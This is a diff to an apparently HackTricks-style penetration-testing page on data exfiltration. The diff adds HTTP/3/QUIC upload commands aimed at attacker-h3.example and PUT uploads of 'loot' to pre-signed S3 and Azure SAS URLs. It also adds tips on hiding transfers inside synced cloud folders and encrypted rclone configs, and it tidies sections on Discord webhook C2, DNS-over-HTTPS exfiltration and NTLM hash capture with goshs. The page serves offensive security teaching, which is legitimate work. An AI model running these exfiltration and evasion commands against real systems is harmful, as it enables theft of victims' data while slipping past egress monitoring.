@@ -119,11 +119,62 @@ if __name__ == "__main__":
 ###
 ```
 
+### HTTP/3 / QUIC
+
+If the egress controls are tuned for classic **TCP/443** inspection but are permissive with **UDP/443**, forcing **HTTP/3** can move the transfer into **QUIC** instead of TLS-over-TCP. The attacker endpoint needs native HTTP/3 support (for example, a reverse proxy or upload endpoint already advertising `Alt-Svc: h3`).
+
+```bash
+# Strict: fail if QUIC/H3 is not available
+curl --http3-only -T loot.7z https://attacker-h3.example/upload
+
+# Opportunistic: prefer H3, but fall back to h2/h1 if QUIC fails
+curl --http3 -T loot.7z https://attacker-h3.example/upload
+
+# Learn the server's Alt-Svc advertisement and reuse it
+curl --alt-svc /tmp/altsvc.cache https://attacker-h3.example/
+curl --alt-svc /tmp/altsvc.cache -T loot.7z https://attacker-h3.example/upload
+```
+
+A 2025 research paper (QUIC-Exfil) found that QUIC's encrypted headers and dynamic address changes can make firewall-level detection of exfiltration harder than TLS- or DNS-based channels, and demonstrated a server-preferred-address method that disguises exfiltration as server-side connection migration.<sup>[[9]](#references)</sup>
+
+### Pre-signed / delegated object-storage uploads
+
+When you can mint or obtain a short-lived **signed URL**, the victim only needs a normal HTTPS client. This avoids installing cloud SDKs or long-lived credentials on the host.<sup>[[8]](#references)</sup> It can also blend into common object-storage traffic.
+
+**Linux / macOS (AWS S3 pre-signed `PUT`)**
+
+```bash
+curl -X PUT -T loot.7z \
+  -H 'Content-Type: application/octet-stream' \
+  'https://bucket.s3.amazonaws.com/case123/loot.7z?<presigned-query>'
+```
+
+**Windows PowerShell (AWS S3 pre-signed `PUT`)**
+
+```powershell
+Invoke-WebRequest -Method Put -InFile .\loot.7z `
+  -ContentType 'application/octet-stream' `
+  -Uri $presignedUrl
+```
+
+**Azure Blob SAS URL**
+
+```bash
+curl -X PUT --data-binary @loot.7z \
+  -H 'x-ms-blob-type: BlockBlob' \
+  -H 'Content-Type: application/octet-stream' \
+  'https://acct.blob.core.windows.net/container/loot.7z?<sas>'
+```
+
+Notes:
+- Pre-signed URLs / SAS tokens usually scope the **path**, **HTTP method**, and **expiration**.<sup>[[8]](#references)[[10]](#references)</sup>
+- For Azure Blob `Put Blob`, `x-ms-blob-type: BlockBlob` is mandatory.<sup>[[10]](#references)</sup>
+- This pattern works well with `curl`, `Invoke-WebRequest`, or any custom implant that can issue a raw HTTPS `PUT`.
+
 ### goshs
 
-[goshs](https://github.com/patrickhener/goshs) is a single-binary replacement for `python3 -m http.server` 
-with upload, download, WebDAV, SFTP, SMB, TLS, authentication, share links, 
-and OOB collaboration features (DNS, SMTP, NTLM hash capture).
+[goshs](https://github.com/patrickhener/goshs) is a single-binary replacement for `python3 -m http.server`.<sup>[[4]](#references)</sup>
+It supports upload, download, WebDAV, SFTP, SMB, TLS, authentication, share links, and OOB collaboration features (DNS, SMTP, NTLM hash capture).<sup>[[4]](#references)</sup>
 
 ```bash
 # Serve current directory on port 8000
@@ -156,7 +207,7 @@ goshs -tunnel
 
 ## Webhooks (Discord/Slack/Teams) for C2 & Data Exfiltration
 
-Webhooks are write-only HTTPS endpoints that accept JSON and optional file parts. They’re commonly allowed to trusted SaaS domains and require no OAuth/API keys, making them useful for low-friction beaconing and exfiltration.
+Webhooks are write-only HTTPS endpoints that accept JSON and optional file parts. They’re commonly allowed to trusted SaaS domains and require no OAuth/API keys, making them useful for low-friction beaconing and exfiltration.<sup>[[5]](#references)[[6]](#references)</sup>
 
 Key ideas:
 - Endpoint: Discord uses https://discord.com/api/webhooks/<id>/<token>
@@ -235,7 +286,7 @@ while ($true) {
 
 Notes:
 - Similar patterns apply to other collaboration platforms (Slack/Teams) using their incoming webhooks; adjust URL and JSON schema accordingly.
-- For DFIR of Discord Desktop cache artifacts and webhook/API recovery, see:
+- For DFIR of Discord Desktop cache artifacts and webhook/API recovery, see the related page below.<sup>[[7]](#references)</sup>
 
 {{#ref}}
 ../generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/discord-cache-forensics.md
@@ -266,9 +317,14 @@ rclone copy /loot secret:$(hostname)-$(date +%F) \
 ```
 
 Notes:
-- `crypt` can encrypt both file contents and names.
-- `chunker` transparently splits large files and reassembles them on download.
-- `rclone.conf` stores `crypt` secrets in an **obscured** form, not strong at-rest protection. For short-lived operations, prefer a dedicated temporary config and remove it afterwards.
+- `crypt` can encrypt both file contents and names.<sup>[[3]](#references)</sup>
+- `chunker` transparently splits large files and reassembles them on download.<sup>[[11]](#references)</sup>
+- `rclone.conf` stores `crypt` secrets in an **obscured** form, not strong at-rest protection.<sup>[[3]](#references)</sup> For short-lived operations, prefer a dedicated temporary config and remove it afterwards. If you must keep it longer, prefer encrypted config handling (`RCLONE_CONFIG_PASS` / `--password-command`) over leaving a bare `rclone.conf` on disk.<sup>[[11]](#references)</sup>
+- If the target already syncs **OneDrive**, **Google Drive**, or **Dropbox**, copying loot into the synchronized directory can piggyback on an already-approved client instead of dropping a new transfer binary.
+
+{{#ref}}
+../generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/local-cloud-storage.md
+{{#endref}}
 
 ## FTP
 
@@ -358,8 +414,7 @@ WindPS-2> cd new_disk:
 ```
 
 ### goshs
-[goshs](https://github.com/patrickhener/goshs) is a single-binary alternative 
-that serves files over SMB and captures NetNTLMv2 hashes from connecting clients:
+[goshs](https://github.com/patrickhener/goshs) is a single-binary alternative that serves files over SMB and captures NTLM hashes from connecting clients.<sup>[[4]](#references)</sup>
 
 ```bash
 # Start SMB server with NTLM hash capture
@@ -449,7 +504,7 @@ base32 -w0 /tmp/loot.bin | tr -d '=' | tr 'A-Z' 'a-z' | fold -w32 | \
   done
 ```
 
-On the authoritative DNS server for `exf.attacker.tld`, sort the queries by the numeric prefix and reconstruct the Base32 stream. This keeps the transport inside HTTPS to the resolver instead of classic UDP/53 DNS.
+On the authoritative DNS server for `exf.attacker.tld`, sort the queries by the numeric prefix and reconstruct the Base32 stream. This keeps the transport inside HTTPS to the resolver instead of classic UDP/53 DNS.<sup>[[2]](#references)</sup>
 
 For full bidirectional DNS tunnel tooling (`iodine`, `dnscat2`, etc.), check [the tunneling page](tunneling-and-port-forwarding.md).
 
@@ -463,8 +518,7 @@ sudo python -m smtpd -n -c DebuggingServer :25
 
 ### goshs
 
-[goshs](https://github.com/patrickhener/goshs) can spin up a quick SMTP server
-to catch email callbacks during OOB exfiltration scenarios:
+[goshs](https://github.com/patrickhener/goshs) can spin up a quick SMTP server to catch email callbacks during OOB exfiltration scenarios.<sup>[[4]](#references)</sup>
 
 ```bash
 # Start SMTP callback server
@@ -555,7 +609,7 @@ cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 
 ## Debug.exe
 
-The `debug.exe` program not only allows inspection of binaries but also has the **capability to rebuild them from hex**. This means that by providing an hex of a binary, `debug.exe` can generate the binary file. However, it's important to note that debug.exe has a **limitation of assembling files up to 64 kb in size**.
+The `debug.exe` program not only allows inspection of binaries but also has the **capability to rebuild them from hex**. This means that by providing an hex of a binary, `debug.exe` can generate the binary file. However, it's important to note that debug.exe has a **limitation of assembling files up to 64 kb in size**.<sup>[[1]](#references)</sup>
 
 ```bash
 # Reduce the size
@@ -567,12 +621,16 @@ Then copy-paste the text into the windows-shell and a file called nc.exe will be
 
 ## References
 
-- [Transferring files to Windows](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
-- [Google Public DNS - DNS-over-HTTPS (DoH)](https://developers.google.com/speed/public-dns/docs/doh)
-- [Rclone `crypt` backend](https://rclone.org/crypt/)
-- [goshs](https://github.com/patrickhener/goshs)
-- [Discord as a C2 and the cached evidence left behind](https://www.pentestpartners.com/security-blog/discord-as-a-c2-and-the-cached-evidence-left-behind/)
-- [Discord Webhooks – Execute Webhook](https://discord.com/developers/docs/resources/webhook#execute-webhook)
-- [Discord Forensic Suite (cache parser)](https://github.com/jwdfir/discord_cache_parser)
+- [1] [Transferring files to Windows](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
+- [2] [Google Public DNS - DNS-over-HTTPS (DoH)](https://developers.google.com/speed/public-dns/docs/doh)
+- [3] [Rclone `crypt` backend](https://rclone.org/crypt/)
+- [4] [goshs](https://github.com/patrickhener/goshs)
+- [5] [Discord as a C2 and the cached evidence left behind](https://www.pentestpartners.com/security-blog/discord-as-a-c2-and-the-cached-evidence-left-behind/)
+- [6] [Discord Webhooks – Execute Webhook](https://discord.com/developers/docs/resources/webhook#execute-webhook)
+- [7] [Discord Forensic Suite (cache parser)](https://github.com/jwdfir/discord_cache_parser)
+- [8] [Uploading objects with presigned URLs - Amazon S3](https://docs.aws.amazon.com/AmazonS3/latest/userguide/PresignedUrlUploadObject.html)
+- [9] [QUIC-Exfil: Exploiting QUIC's Server Preferred Address Feature to Perform Data Exfiltration Attacks](https://arxiv.org/abs/2505.05292)
+- [10] [Put Blob (REST API) - Azure Storage](https://learn.microsoft.com/en-us/rest/api/storageservices/put-blob)
+- [11] [Rclone documentation](https://rclone.org/docs/#configuration-encryption)
 
 {{#include ../banners/hacktricks-training.md}}
